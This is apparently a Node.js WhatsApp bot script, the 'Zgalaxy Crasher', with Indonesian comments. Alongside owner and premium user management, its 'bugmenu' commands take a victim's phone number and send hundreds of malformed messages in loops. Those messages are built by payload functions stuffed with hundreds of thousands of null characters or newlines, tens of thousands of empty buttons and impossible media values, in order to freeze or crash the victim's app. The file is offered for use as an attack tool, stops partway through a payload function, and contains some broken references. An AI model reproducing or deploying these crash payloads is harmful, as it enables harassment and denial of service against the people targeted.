/*

€ Creator: AlwaysMunn
€ Support:
   - Nakama( All Members )
  
- <Gunakan script ini dengan bijak dan bertanggung jawab. Jangan pernah menyalahgunakan untuk menyerang mereka yang tidak bersalah. Segala konsekuensi sepenuhnya menjadi tanggung jawab pengguna!>

! Don't Remove This Credits ! 
! Jangan Hapus Credit Ini Cil !
! Hapus credit moga ema elo mati!! 
*/
require('./control')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReriyuectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediariyuInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisriyuectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

// ===================== Module =====================
const { 
    spawn: 
    spawn, 
    exec 
} = require('child_process')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed()
const jimp = require("jimp")
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { ocrSpace } = require("ocr-space-api-wrapper")
const sharp = require("sharp")
module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);

// ===================== Database ===========================
const owner = JSON.parse(fs.readFileSync('./function/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./function/premium.json'))
// ===================== Body dan Prefix =====================
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = global.prefa 
  ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) 
    ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] 
    : "" 
  : global.prefa ?? global.prefix

// ===================== Command Handling ==================
const isCmd = budy.startsWith(prefix)
const command = isCmd ? budy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = budy.trim().split(/ +/).slice(1)
const qtext = q = args.join(" ")

// ===================== User Info ===========================
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

const isPremium = [botNumber, ...Premium]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)

// ===================== Quoted Message =====================
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m

// ===================== Utility Functions =====================
const { 
    smsg,
    tanggal, 
    getTime, 
    isUrl, 
    sleep, 
    clockString, 
    runtime, 
    fetchJson, 
    getBuffer, 
    jsonformat, 
    format, 
    parseMention, 
    getRandom, 
    getGroupAdmins, 
    generateProfilePicture 
} = require('../function/storage')

// ===================== Group Info ==========================
const from = mek.key.remoteJid
const sender = m.isGroup 
  ? (m.key.participant ? m.key.participant : m.participant) 
  : m.key.remoteJid

const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : ""

// ===================== User Info Tambahan ==================
const pushname = m.pushName || "No Name"

// ===================== Waktu & Lokalisasi ==================
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
})

// ===================== MIME ==============================
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted);
// ===================== Exif & Media Converter ===============
const { 
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    addExif 
} = require('../function/exif.js')

// ===================== Media Assets ========================
const imgCrL = fs.readFileSync("./console/media/CrL.jpg")
const I1 = fs.readFileSync(`./console/media/foto1.jpg`)
const I2 = fs.readFileSync(`./console/media/foto2.jpg`)
const I3 = fs.readFileSync(`./console/media/foto3.jpg`)
const I4 = fs.readFileSync(`./console/media/foto4.jpg`)
const I5 = fs.readFileSync(`./console/media/foto5.jpg`)
// ===================== Access Control =====================
if (!client.public) {
  if (!isCreator) return
}
   
// ===================== Console Logger =====================
if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}

async function NanoTTDL(videoUrl) {
  try {
    const endpoint = "https://ssstik.io/abc?url=dl";
    const requestData = new URLSearchParams({
      id: videoUrl,
      locale: "id",
      tt: "VktkdWY4",
    });
    const headers = {
      "HX-Request": "true",
      "HX-Trigger": "_gcaptcha_pt",
      "HX-Target": "target",
      "HX-Current-URL": "https://ssstik.io/id",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    };
    const response = await axios.post(endpoint, requestData.toString(), { headers });
    const $ = cheerio.load(response.data);
    const title = $("h2").text().trim() || "Judul tidak tersedia";
    const description = $(".maintext").text().trim() || "Deskripsi tidak tersedia";
    const downloadLink = $(".download_link.without_watermark").attr("href") || null;
    const hdDownloadLink = $(".download_link.without_watermark_hd").attr("href") || null;

    return {
      title,
      description,
      downloadLink,
      hdDownloadLink,
    };
  } catch (error) {
    console.error("Error saat scraping:", error.message);
    return { error: error.message };
  }
}
// ===================== Bug Functions Ampas eloo kontol  =====================

// ===================== Custom Reply =====================
async function reply(text) {
            client.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "Zgalaxy ☇ Crasher",
                        body: "© - 2026 Bot's",
                        thumbnailUrl: "https://files.catbox.moe/93rlc8.png",
                        sourceUrl: "https://t.me/AlwaysMunnn",
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: fquoted.channel })
        }

const X1 = [I1, I2, I3, I4, I5]
const randomIndex = Math.floor(Math.random() * X1.length)
const V1 = X1[randomIndex]
// ===================== Custom Quoted =====================
const fquoted = {
    channel: {
        key: {
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "13135550202@s.whatsapp.net"
        },
        message: {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363410217064953@newsletter",
                newsletterName: " X ",
                caption: "Your digital life, fully powered.",
                inviteExpiration: "1757494779"
            }
        }
    }
};

const kontolCape = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: V1,
					itemCount: `9999`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `Zgalaxy ☇ Crasher`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
// ===================== Emoji Reaction =====================
const reaction = async (isTarget, emoji) => {
    client.sendMessage(isTarget, {
        react: {
            text: emoji,
            key: m.key 
        } 
    });
}

// ===================== Mention Helper =====================
client.ments = async (text) => {
    return [m.chat];
}

// ===================== Image Resizer (WIP) =================
async function resize(image, width, height) {
  const img = await jimp.read(image)
  img.resize(width, height)
  return await img.getBufferAsync(jimp.MIME_JPEG)
}
// ===================== Interface Menu =====================
switch(command) {
case "menu":{
  let menu = `hallo ${pushname}. Ada yang bisa AlwaysMunn bantu?

▢ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝗌𝖼𝗋𝗂𝗉𝗍
> ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
> ▢ developer: Fhkry
> ▢ developer: Rizz
> ▢ 𝗉𝗋𝖾𝖿𝗂𝗑: Multi
> ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 4.0
> ▢ run𝗍𝗂𝗆𝖾 botz: ${runtime(process.uptime())}
> ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
> ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )

▢ Command Botz
> .bugmenu
> .ownernenu`

  await client.sendMessage(m.chat, {
    interactiveMessage: {
      title: menu,
      footer: `\n</> AlwaysMunn </>`,
      thumbnail: "https://files.catbox.moe/93rlc8.png",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "AlwaysMunn - 2026",
            url: "t.me/AlwaysMunnn",
            copy_code: "© - 2026 Bot's",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "Menu Options",
            button_title: "Select Option"
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/AlwaysMunnn",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
        {
          name: "call_permission_request",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Telegram Channel",
              url: "https://t.me/AlwaysMunnn",
              merchant_url: "https://t.me/AlwaysMunnn"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "WhatsApp Channel",
              url: "https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u",
              merchant_url: "https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "My Telegram",
              url: "https://t.me/AlwaysMunnn",
              merchant_url: "https://t.me/AlwaysMunnn"
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Contact Developer",
              url: "https://wa.me/6285876670135",
              merchant_url: "https://wa.me/6285876670135"
            })
          },
          {
            name: "cta_copy", 
            buttonParamsJson: JSON.stringify({
              display_text: "📋 Note",
              id: "copy_code_123",
              copy_code: "Jangan Lah Semangat Tetaplah Putus Asa😕. quotes AlwaysMunn 🎭"
            })
          }
        ]
      }
    }
  }, { quoted: kontolCape });
}
break

case "ownermenu": {
  let menu = `hallo ${pushname}. Ini adalah menu setting.

▢ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝗌𝖼𝗋𝗂𝗉𝗍

> ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
> ▢ developer: Fhkry
> ▢ developer: Rizz
> ▢ 𝗉𝗋𝖾𝖿𝗂𝗑: Multi
> ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 4.0
> ▢ run𝗍𝗂𝗆𝖾 botz: ${runtime(process.uptime())}
> ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
> ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )

▢ Owner Commands

> ▢ .addowner
> ▢ .delowner
> ▢ .addprem
> ▢ .delprem
> ▢ .public
> ▢ .self
> ▢ .restart
> ▢ .shutdown`

  await client.sendMessage(m.chat, {
    interactiveMessage: {
      title: menu,
      footer: `\n</> AlwaysMunn </>`,
      thumbnail: "https://files.catbox.moe/93rlc8.png",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "AlwaysMunn - 2026",
            url: "t.me/AlwaysMunnn",
            copy_code: "© - 2026 Bot's",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "Menu Options",
            button_title: "Select Option"
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/AlwaysMunnn",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
        {
          name: "call_permission_request",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram Channel",
            url: "https://t.me/AlwaysMunnn",
            merchant_url: "https://t.me/AlwaysMunnn"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "WhatsApp Channel",
            url: "https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u",
            merchant_url: "https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "My Telegram",
            url: "https://t.me/AlwaysMunnn",
            merchant_url: "https://t.me/AlwaysMunnn"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Contact Developer",
            url: "https://wa.me/6285876670135",
            merchant_url: "https://wa.me/6285876670135"
          })
        },
        {
          name: "cta_copy", 
          buttonParamsJson: JSON.stringify({
            display_text: "📋 Note",
            id: "copy_code_123",
            copy_code: "Jangan Lah Semangat Tetaplah Putus Asa😕. quotes AlwaysMunnn 🎭"
            })
          }
        ]
      }
    }
  }, { quoted: kontolCape });
}
break

case "bugmenu": {
  let menu = `
▢ 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝗌𝖼𝗋𝗂𝗉𝗍

> ▢ d𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋: AlwaysMunn
> ▢ developer: Fhkry
> ▢ developer: Rizz
> ▢ 𝗉𝗋𝖾𝖿𝗂𝗑: Multi
> ▢ 𝗏𝖾𝗋𝗌𝗂𝗈𝗇: 4.0
> ▢ run𝗍𝗂𝗆𝖾 botz: ${runtime(process.uptime())}
> ▢ 𝗅𝖺𝗇𝗀𝗎𝖺𝗀𝖾: JavaScript 
> ▢ 𝗍𝗒𝗉𝖾: ( CommonJs )

▢ Bug Comands

> ▢ .delay-esy 62xxxx
> ╰───➤  delay easy 50%

> ▢ .delay-medium 62xxxx
> ╰───➤  delay medium 80%

> ▢ .delay-hard 62xxxx
> ╰───➤  delay hard 100%
`

await client.sendMessage(m.chat, {
    interactiveMessage: {
      title: menu,
      footer: `\n</> AlwaysMunn </>`,
      thumbnail: "https://files.catbox.moe/yr5auw.png",
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "AlwaysMunn - 2026",
            url: "t.me/AlwaysMunnn",
            copy_code: "© - 2026 Bot's",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "Menu Options",
            button_title: "Select Option"
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/AlwaysMunnn",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
        {
          name: "call_permission_request",
          buttonParamsJson: JSON.stringify({
            has_multiple_buttons: true
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram Channel",
            url: "https://t.me/AlwaysMunnn",
            merchant_url: "https://t.me/AlwaysMunnn"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "WhatsApp Channel",
            url: "https://whatsapp.com/channel/0029VbCbE5aJ3jv0X1vOkt1u",
            merchant_url: "https://whatsapp.com/channel/0029Vb7uU9W9WtC5PK6X8P2m"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "My Telegram",
            url: "https://t.me/AlwaysMunnn",
            merchant_url: "https://t.me/AlwaysMunnn"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Contact Developer",
            url: "https://wa.me/6285876670135",
            merchant_url: "https://wa.me/6285876670135"
          })
        },
        {
          name: "cta_copy", 
          buttonParamsJson: JSON.stringify({
            display_text: "📋 Note",
            id: "copy_code_123",
            copy_code: "Janganlah Semangat Tetaplah Putus Asa😕. quotes AlwaysMunn 🎭"
            })
          }
        ]
      }
    }
  }, { quoted: kontolCape });
}
break
// ===================== CASE: Add Owner =====================
case 'addowner': 
case 'addown': {
    if (!isCreator) return reply(`hanya pemilik yang bisa menggunakan perintah ini!`);
    if (!args[0]) return reply(` penggunaan: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let isRegistered = await client.onWhatsApp(number + "@s.whatsapp.net");
    
    if (isRegistered.length === 0) return reply(` nomor tidak valid!`);

    owner.push(number);
    Premium.push(number);
    
    fs.writeFileSync('./function/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(` pemilik berhasil ditambahkan!`);
}
break;

// ===================== CASE: Delete Owner =====================
case 'delowner': 
case 'delown': {
    if (!isCreator) return reply(` hanya pemilik yang bisa menggunakan perintah ini!`);
    if (!args[0]) return reply(` penggunaan: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let indexOwner = owner.indexOf(number);
    let indexPremium = Premium.indexOf(number);

    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);

    fs.writeFileSync('./function/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(` pemilik berhasil dihapus!`);
}
break;

// ===================== CASE: Add Premium =====================
case 'addpremium': 
case 'addprem': {
    if (!isCreator) return reply(` hanya pemilik yang bisa menggunakan perintah ini!`);
    if (!args[0]) return reply(` penggunaan: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let isRegistered = await client.onWhatsApp(number + "@s.whatsapp.net");

    if (isRegistered.length === 0) return reply(` nomor tidak valid!`);

    Premium.push(number);
    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(`pengguna premium berhasil ditambahkan!`);
}
break;

// ===================== CASE: Delete Premium =====================
case 'delpremium': 
case 'delprem': {
    if (!isCreator) return reply(` hanya pemilik yang bisa menggunakan perintah ini!`);
    if (!args[0]) return reply(` penggunaan: ${prefix + command} 62xxx`);

    let number = qtext.split("|")[0].replace(/\D/g, '');
    let indexPremium = Premium.indexOf(number);

    if (indexPremium !== -1) Premium.splice(indexPremium, 1);

    fs.writeFileSync('./function/premium.json', JSON.stringify(Premium));

    reply(` pengguna premium berhasil dihapus!`);
}
break;

// ===================== CASE: Public Mode =====================
case 'public': {
    if (!isCreator) return reply(` hanya pemilik yang bisa menggunakan perintah ini.`);
    
    client.public = true;
    reply(`bot sekarang dalam mode publik.`);
}
break;

// ===================== CASE: Private Mode =====================
case 'self': 
case 'private': {
    if (!isCreator) return reply(`hanya pemilik yang bisa menggunakan perintah ini.`);
    
    client.public = false;
    reply(` bot sekarang dalam mode pribadi.`);
}
break;

// ===================== CASE: Restart Bot =====================
case 'restart': {
    if (!Access) return reply(`*english:* restarting bot...\n\n*indonesia:* memulai ulang bot...`);

    setTimeout(() => {
        process.exit(1);
    }, 3000);
}
break;

// ===================== CASE: Shutdown Bot =====================
case 'shutdown': {
    if (!Access) return reply(` mematikan bot...`);

    setTimeout(() => {
        process.exit();
    }, 3000);
}
break;

// ===================== CASE: Force Close =====================
case 'delay-esy': {
    if (!isPremium) return reply(`hanya pengguna premium yang dapat menggunakan perintah ini.`);
    if (!q) return reply(`penggunaan:\n${prefix + command} 62xx / @tag`); // Ubah qtext jadi q

    let jidx = q.replace(/[^0-9]/g, ""); // Ubah qtext jadi q
    
    if (jidx.startsWith('0')) {
        return reply(` nomor harus dimulai dengan kode negara.`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    reply(` berhasil mengirim pesan bug ke ${target}`);
    
    for (let r = 0; r < 300; r++) {
    await xCursedFlowRes(target);
    FreezeChatXBlankHard(client, target);
    await sleep(100);
    }
}
break;

// ===================== CASE: Delay Invisible =====================
case 'delay-medium': {
    if (!isPremium) return reply(`hanya pengguna premium yang dapat menggunakan perintah ini.`);
    if (!qtext) return reply(` penggunaan:\n${prefix + command} 62xx / @tag`);

    let jidx = qtext.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    reply(` berhasil mengirim pesan bug ke ${target}`);

    // Parameters
    for (let r = 0; r < 200; r++) {
        await VnXBlankXChatLockNew(client, target);
        await VnXBlankXChatLockNew(client, target);
        await VnXBlankXChatLockNew(client, target);
        await sleep(100);
    }
}
break;

// ===================== CASE: Delay Invisible With Message =====================
case 'delay-hard': {
    if (!isPremium) return reply(` hanya pengguna premium yang dapat menggunakan perintah ini.`);
    if (!qtext) return reply(` penggunaan:\n${prefix + command} 62xx / @tag`);

    let jidx = qtext.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return reply(`nomor harus dimulai dengan kode negara.`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    reply(`berhasil mengirim pesan bug ke ${target}`);

    // Parameters
    for (let r = 0; r < 250; r++) {
        await FreezeChatXBlankHard(client, target);
        await FreezeChatXBlankHard(client, target);
        await FreezeChatXBlankHard(client, target);
        await FreezeChatXBlankHard(client, target);
        await sleep(100);
    }
}
break;
        
//ALL FUNC BUG\\
async function FreezeChatXBlankHard(client, target) {
  const Fzrx = {
    interactiveMessage: {
      header: {
        title: " ",
        hasMediaAttachment: false
      },
      locationMessage: {
        degreesLatitude: -999.999999,
        degreesLongitude: 999.999999,
        name: "\u0000".repeat(150000),
        address: "\n".repeat(250000)
      },
      body: {
        text: "FreezerX" + "𑜦𑜠𑜦𑜠",
        format: 1
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50000 }, () => ({}))
      }
    }
  };
                                                
  await client.relayMessage(target, Fzrx, {
    participant: { jid: target } 
  });
}
        
async function hahahambut(target) {
    try {

      const payload = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              caption: "\u0000".repeat(250000), 
              fileLength: "999999999999999999", 
              height: 999999999,
              width: 999999999,
              fileSha256: Buffer.alloc(1000000, 0xFF), 
              fileEncSha256: Buffer.alloc(1000000, 0xFF),
              contextInfo: {
                quotedMessage: {
                  quotedMessage: {
                    quotedMessage: {} 
                  }
                }
              }
            }
          }
        }
      };
  
      return await sendMessage(target, {
        nativeFlowResponseMessage: payload
      });
        
    } catch (error) { 
      console.error("Error:", error);
      throw error;
    }
  }    
  
async function spesialfreze(client, target) {
  try {
    console.log(`[NANZ-FREEZE] Processing: ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);
    const formattedTarget = target.includes("@") ? target : target + "@s.whatsapp.net";

    const generateWAMessageFromContent = (jid, content, options = {}) => {
      return {
        key: { remoteJid: jid, fromMe: true, id: generateId() },
        message: content,
        messageTimestamp: Math.floor(Date.now() / 1000),
        ...options
      };
    };

    const msg = generateWAMessageFromContent(formattedTarget, {
      interactiveResponseMessage: {
        body: { text: "spesial", format: 1 },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: JSON.stringify({
            wa_flow_response_params: {
              title: "𑇂𑆵𑆴𑆿".repeat(60000)
            }
          }),
          version: 3
        }
      }
    }, {
      participant: { jid: formattedTarget }
    });

    await client.relayMessage(formattedTarget, msg.message, { messageId: msg.key.id });

    console.log(`[NANZ-FREEZE] Success: ${formattedTarget}`);

  } catch (error) {
    console.error(`[NANZ-FREEZE] Error: ${error.message}`);
  }
}    
        
async function blanknew(client, target) {
 const nanz = {
      newsletterAdminInviteMessage: {
            newsletterJid: "123456789@newsletter",
            inviteCode: "??".repeat(120000),
            inviteExpiration: 99999999999,
            newsletterName: "??" + "?".repeat(250000),
            body: {
                text: "Rizz Is Here" + "?".repeat(250000)
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999999,
